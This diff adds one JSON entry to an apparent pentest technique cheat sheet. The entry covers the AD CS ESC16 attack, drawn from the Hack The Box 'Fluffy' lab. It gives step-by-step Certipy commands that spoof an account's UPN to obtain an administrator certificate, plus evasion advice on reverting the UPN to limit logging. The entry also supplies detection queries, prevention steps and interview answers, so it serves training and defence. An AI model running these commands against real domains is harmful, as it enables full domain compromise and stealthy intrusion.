@@ -1,0 +1,112 @@
+{
+  "id": "ad-esc16-upn-manipulation",
+  "name": "AD CS ESC16 - Security Extension Disabled (UPN Spoof to DA)",
+  "command": "certipy-ad account update -u <user>@<domain> -p <password> -dc-ip <dc_ip> -user <controlled_account> -upn administrator",
+  "description": "ESC16 abuses a CA that globally disables the SID security extension (szOID_NTDS_CA_SECURITY_EXT). With write over a controlled account's userPrincipalName, set its UPN to a privileged target (e.g. administrator), request a client-auth certificate, revert the UPN, then authenticate with the cert as the target - because the cert carries no SID binding, the DC maps it purely by UPN. Final step of the HTB Fluffy chain (ca_svc -> Administrator).",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "ADCS",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "HTB Fluffy engagement; Certipy ESC16",
+  "tags": [
+    "adcs",
+    "esc16",
+    "upn-spoofing",
+    "certipy",
+    "certificate",
+    "privilege-escalation",
+    "pkinit"
+  ],
+  "mitre": [
+    "T1649"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== WHAT ESC16 IS ===\nThe CA is configured to OMIT the SID security extension (szOID_NTDS_CA_SECURITY_EXT)\nfrom every certificate it issues (globally disabled). Modern DCs use that extension to\nstrongly bind a certificate to an account SID; without it, certificate-based logon falls\nback to mapping by userPrincipalName (UPN). So if you can change a controlled account's\nUPN to a privileged target and get a cert, the DC authenticates you as the target.\n\n=== REQUIREMENTS ===\n  - An account you control that can enroll in a client-auth template (e.g. User).\n  - Write over that account's userPrincipalName (you control it, or have GenericWrite).\n  - The CA has ESC16 (certipy find flags [!] ESC16 / 'security extension disabled').\n  - Clock in sync with the DC (PKINIT) - see ad-faketime-kerberos.\n\n=== THE FLOW (certipy) ===\n  1. Set the controlled account UPN to the target (drop any @domain suffix for a bare name):\n       certipy account update -user <controlled_account> -upn administrator ...\n  2. Request a cert AS the controlled account (the cert now bears UPN=administrator):\n       certipy req -u <controlled_account>@<domain> -p <password> -ca <ca_name> -template User ...\n  3. Revert the UPN so you do not break the account / raise flags:\n       certipy account update -user <controlled_account> -upn <controlled_account>@<domain> ...\n  4. Authenticate with the cert - the DC maps it to administrator by UPN:\n       certipy auth -pfx administrator.pfx -dc-ip <dc_ip>\n     -> yields administrator TGT + NT hash (UnPAC).\n\n=== FLUFFY ===\n  ca_svc taken via Shadow Credentials -> ca_svc can update its own UPN -> ESC16 to\n  Administrator -> admin hash -> root flag.",
+  "examples": [
+    {
+      "label": "1) Set controlled account UPN to administrator",
+      "command": "certipy-ad account update -u ca_svc@fluffy.htb -p '<ca_svc_pass_or_hash>' -dc-ip 10.129.65.243 -user ca_svc -upn administrator"
+    },
+    {
+      "label": "2) Request a cert as the controlled account (now UPN=administrator)",
+      "command": "certipy-ad req -u ca_svc@fluffy.htb -p '<pass>' -ca fluffy-DC01-CA -template User -dc-ip 10.129.65.243"
+    },
+    {
+      "label": "3) Revert the UPN",
+      "command": "certipy-ad account update -u ca_svc@fluffy.htb -p '<pass>' -dc-ip 10.129.65.243 -user ca_svc -upn ca_svc@fluffy.htb"
+    },
+    {
+      "label": "4) Authenticate as administrator with the cert",
+      "command": "certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.65.243"
+    }
+  ],
+  "references": [
+    {
+      "title": "Certipy 4.8 - ESC16 support",
+      "url": "https://github.com/ly4k/Certipy"
+    },
+    {
+      "title": "SpecterOps - Certified Pre-Owned",
+      "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-shadow-credentials",
+      "note": "Take the CA-managing service account first via Shadow Credentials.",
+      "rel": "prereq"
+    },
+    {
+      "id": "ad-faketime-kerberos",
+      "note": "PKINIT cert auth fails on clock skew - sync time first.",
+      "rel": "prereq"
+    },
+    {
+      "id": "ad-esc1-certipy-linux",
+      "note": "ESC1 is the SAN-based sibling when the template allows enrollee-supplied subject.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "The issuing CA globally disables the SID security extension, so issued certificates lack the strong SID binding. Certificate logon then maps by userPrincipalName. An attacker who can rewrite a controlled account's UPN to a privileged target obtains a certificate that the DC honors as that target.",
+    "prerequisites": "Control of an account that can enroll in a client-auth template, write over its userPrincipalName, and a CA with the security extension disabled (ESC16).",
+    "impact": "Authentication as any account (including Domain Admin / Administrator) via a forged-identity certificate - full domain compromise.",
+    "detection": "[MITRE T1649] Event 5136 modifying userPrincipalName on an account (especially set to a privileged name, then reverted); Event 4886/4887 on the CA (certificate requested/issued) for that account; Event 4768 PKINIT logon as the target using a certificate; certipy find output marking the CA as ESC16.",
+    "artifacts": "5136 UPN change + revert pair; 4886/4887 CA enrollment; 4768 PKINIT as the impersonated account; issued .pfx on the attacker host.",
+    "splunk_spl": "index=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=5136 AttributeLDAPDisplayName=\"userPrincipalName\"\n| table _time, SubjectUserName, ObjectDN, AttributeValue, OperationType\n\nindex=wineventlog sourcetype=\"WinEventLog:Security\" (EventCode=4886 OR EventCode=4887)\n| table _time, Requester, CertificateTemplate, ComputerName",
+    "elastic_kql": "event.code:\"5136\" AND winlog.event_data.AttributeLDAPDisplayName:\"userPrincipalName\"",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 5136 and AttributeLDAPDisplayName == \"userPrincipalName\"\n| project TimeGenerated, Actor=SubjectUserName, Target=ObjectDN, NewUPN=tostring(AttributeValue), OperationType\n| join kind=leftouter (\n    SecurityEvent | where EventID in (4886, 4887)\n    | project CaTime=TimeGenerated, Requester, CertificateTemplate\n) on $left.Actor == $right.Requester\n| sort by TimeGenerated desc",
+    "sigma_rules": "win_security_adcs_esc16_upn_manipulation, win_security_userprincipalname_change_privileged",
+    "prevention": "Re-enable the SID security extension on the CA (do NOT globally disable szOID_NTDS_CA_SECURITY_EXT); enforce strong certificate mapping on DCs (KB5014754 Full Enforcement); restrict who can modify userPrincipalName; require CA manager approval on client-auth templates; treat CA servers as Tier-0; monitor 5136 on userPrincipalName and 4886/4887 enrollment.",
+    "evasion": "Revert the UPN immediately after enrollment so the account looks normal; use the issued certificate only for a single PKINIT auth to minimize logging.",
+    "sources": [
+      "HTB Fluffy",
+      "MITRE T1649",
+      "Certipy"
+    ],
+    "misconfiguration": "CA has the SID security extension disabled globally (ESC16), and a controllable account can both enroll for client-authentication certificates and have its userPrincipalName rewritten.",
+    "vulnerable_config": "# certipy flags it:\ncertipy-ad find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -stdout\n# Look for: [!] ESC16 / 'Security Extension Disabled' on the CA.\n# Registry on the CA (bad): szOID_NTDS_CA_SECURITY_EXT disabled via DisableExtensionList / EDITF flags.",
+    "secure_config": "# Re-enable the SID security extension on the CA (remove it from the disable list), then restart certsvc:\ncertutil -setreg policy\\DisableExtensionList -szOID_NTDS_CA_SECURITY_EXT\ncertutil -setreg policy\\EditFlags +EDITF_... # (undo any weakening flags)\nnet stop certsvc && net start certsvc\n# Enforce strong certificate mapping on DCs (KB5014754 Full Enforcement) so UPN-only mapping is rejected."
+  },
+  "tools": [
+    "certipy"
+  ],
+  "interview": [
+    {
+      "q": "Explain ESC16 and how it differs from ESC1.",
+      "a": "ESC16 is a CA-wide misconfiguration where the SID security extension is disabled on all issued certificates, so certificate logon maps by UPN instead of a strong SID binding. You rewrite a controlled account's UPN to a target, enroll, revert, and authenticate as the target. ESC1 instead relies on a specific template that lets the enrollee supply the SAN directly; ESC16 needs no such template because the weakness is the whole CA dropping the SID binding.",
+      "role": "both"
+    },
+    {
+      "q": "As a defender, how do you detect and prevent ESC16?",
+      "a": "Detect via Event 5136 changes to userPrincipalName (set to a privileged name then reverted) correlated with CA enrollment (4886/4887) and PKINIT logon (4768). Prevent by re-enabling the SID security extension on the CA, enforcing strong certificate mapping on DCs (KB5014754 Full Enforcement), restricting UPN write access, and treating CA hosts as Tier-0.",
+      "role": "soc"
+    }
+  ]
+}
